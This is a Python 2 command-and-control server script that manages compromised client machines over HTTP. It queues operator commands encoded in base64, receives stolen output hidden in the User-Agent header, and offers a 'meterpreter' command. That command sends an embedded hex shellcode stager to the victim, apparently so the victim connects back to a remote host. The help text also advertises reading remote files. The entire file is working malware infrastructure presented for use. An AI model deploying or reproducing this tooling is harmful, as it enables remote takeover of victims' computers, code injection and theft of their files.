#!/usr/bin/python

from urlparse import urlparse, parse_qs
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from SocketServer import ThreadingMixIn
import base64
import sys
import time
from threading import Thread
from select import select

serverPort = 5000
clients = {}
# Current id for send commands
current_key = ""
cmd = ""

meterpreter = "fc,e8,82,00,00,00,60,89,e5,31,c0,64,8b,50,30,8b,52,0c,8b,52,14,8b,72,28,0f,b7,4a,26,31,ff,ac,3c,61,7c,02,2c,20,c1,cf,0d,01,c7,e2,f2,52,57,8b,52,10,8b,4a,3c,8b,4c,11,78,e3,48,01,d1,51,8b,59,20,01,d3,8b,49,18,e3,3a,49,8b,34,8b,01,d6,31,ff,ac,c1,cf,0d,01,c7,38,e0,75,f6,03,7d,f8,3b,7d,24,75,e4,58,8b,58,24,01,d3,66,8b,0c,4b,8b,58,1c,01,d3,8b,04,8b,01,d0,89,44,24,24,5b,5b,61,59,5a,51,ff,e0,5f,5f,5a,8b,12,eb,8d,5d,68,6e,65,74,00,68,77,69,6e,69,54,68,4c,77,26,07,ff,d5,31,db,53,53,53,53,53,68,3a,56,79,a7,ff,d5,53,53,6a,03,53,53,68,bb,01,00,00,e8,73,01,00,00,2f,72,65,73,74,2f,61,70,69,2f,5f,6a,6f,66,75,49,55,62,4b,50,56,75,6c,6d,2d,58,4d,6f,55,61,6b,67,6c,34,44,6a,42,51,56,32,57,4f,34,4e,30,6c,46,6b,48,45,34,31,6f,77,7a,44,47,57,6b,34,38,57,44,75,4a,39,64,59,56,53,53,69,43,35,69,32,46,4c,6f,38,48,4f,66,69,74,73,6a,6e,77,71,49,45,48,52,6a,45,6d,50,47,33,50,4d,49,76,59,67,4e,4c,5f,75,63,4f,45,59,47,57,59,45,59,77,76,67,5a,50,6f,42,36,58,52,43,47,4b,41,36,71,66,52,5a,68,59,58,6d,6f,2d,73,6b,67,55,55,5f,77,47,62,69,6c,34,57,56,54,6c,56,47,78,36,34,58,34,73,61,63,52,62,79,77,43,69,47,44,76,73,70,32,51,55,71,44,2d,6f,71,71,34,30,4a,35,71,44,32,45,37,57,32,66,4b,74,4c,50,39,64,64,54,6d,6c,48,34,38,75,33,41,4b,43,67,59,61,34,35,34,41,00,50,68,57,89,9f,c6,ff,d5,89,c6,53,68,00,32,e0,84,53,53,53,57,53,56,68,eb,55,2e,3b,ff,d5,96,6a,0a,5f,68,80,33,00,00,89,e0,6a,04,50,6a,1f,56,68,75,46,9e,86,ff,d5,53,53,53,53,56,68,2d,06,18,7b,ff,d5,85,c0,75,14,68,88,13,00,00,68,44,f0,35,e0,ff,d5,4f,75,cd,e8,4d,00,00,00,6a,40,68,00,10,00,00,68,00,00,40,00,53,68,58,a4,53,e5,ff,d5,93,53,53,89,e7,57,68,00,20,00,00,53,56,68,12,96,89,e2,ff,d5,85,c0,74,cf,8b,07,01,c3,85,c0,75,e5,58,c3,5f,e8,6b,ff,ff,ff,76,69,64,65,6f,2e,63,66,74,2d,73,64,2e,78,79,7a,00,bb,e0,1d,2a,0a,68,a6,95,bd,9d,ff,d5,3c,06,7c,0a,80,fb,e0,75,05,bb,47,13,72,6f,6a,00,53,ff,d5"

class webServer(BaseHTTPRequestHandler):

    def do_GET(self,):
        global current_key
        global cmd
        useragent = self.headers.get('User-Agent').split('|')
        querydata = parse_qs(urlparse(self.path).query)
        addClient(querydata)
        #delClient()
        if 'key' in querydata:
            if querydata['key'][0] == current_key:
                self.send_response(200)
                self.send_header("Content-type","text/html")
                self.end_headers()

                if len(useragent) == 2:
                    response = useragent[1].split(',')[0]
                    if response.decode("base64") != "":
                        sys.stdout.write('\x1b[1;32m' + response.decode("base64") + "\x1b[0m")
                        sys.stdout.flush()
                        #print(response.decode("base64"))
                    self.wfile.write("")
                    return
                self.wfile.write("<cmd123>{}</cmd123>".format(base64.b64encode(cmd)))
                cmd = ""
                return
                # Hold connection
                self.wfile.write("<cmd123>{}</cmd123>".format(base64.b64encode("")))
        self.send_response(404)
        self.send_header("Content-type","text/html")
        self.end_headers()
        self.wfile.write("Not Found")
        return

    def log_message(self, format, *args):
        return

def listClients():
    par = 0
    for i in clients:
        par = par + 1
        print ("\x1b[1;33m{}) {} {}".format(par, i, clients[i][0]) + '\x1b[0m')
    if (par == 0):
        print ("\x1b[1;31mClients not found\x1b[0m")


def selectClient(clientID):
     for i in clients:
         if clientID == i[:len(clientID)]:
             cur = i
             break
     return cur

def addClient(query):
    global clients
    if 'id' in query:
        if query['key'][0] in clients.keys():
            # In future we will update timer if exist
            pass
        else:
            # Print message about adding new client
            print ("\r\n\x1b[1;33mNew client added: " + query['key'][0] + ": " + query['id'][0] + '\x1b[0m')
        clients[query['key'][0]] = [query['id'][0],time.time()]


def delClient():
    global clients
    global current_key
    tmp_clients = clients
    for i in clients.keys():
        if ((time.time() - clients[i][1]) > 10):
            if current_key == i:
               current_key = ""
            print ("\x1b[1;31mClient: " + i + " disconnected!!!\x1b[0m")
            del clients[i]

def runShell():
    global current_key
    global cmd
    while (True):
        delClient()
        timeout = 60
        sys.stdout.write('\x1b[1;35m' + current_key + '\x1b[0m' + ' | ' + '\x1b[1;34m' + "Enter command:> " + '\x1b[0m')
        sys.stdout.flush()
        rlist, _, _ = select([sys.stdin], [], [], timeout)
        if rlist:
          cmd = sys.stdin.readline().rstrip()
          if (cmd == "list"):
              listClients()
              cmd = ""
          elif (cmd.split(' ')[0] == "select"):
              current_key = selectClient(cmd.split(' ')[1])
              #print ("Current key: " + current_key)
              cmd = ""
          elif (cmd.split(' ')[0] == "meterpreter"):
              cmd = "load " + meterpreter
          elif (cmd == "help"):
              print ("\x1b[1;38mAvailable commands:\r\nlist\t\t-\tDisplay existing connections\r\nselect ID\t-\tselect connection with ID\r\nmeterpreter\t-\tLoad meterpreter shell into remote host\r\nread FILENAME\t-\tread file into Base64\r\n" + "\x1b[0m")
              cmd = ""




class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle request in a separate thread."""

try:
    server = ThreadedHTTPServer(("", serverPort), webServer)
    print("Server running on port: {}\r\n".format(serverPort))
    print ("\x1b[1;38mFor print available commands type \"help\"\x1b[0m\r\n")
    firstShell = Thread(target = runShell)
    firstShell.start()
    server.serve_forever()

except KeyboardInterrupt:
    server.socket.close()

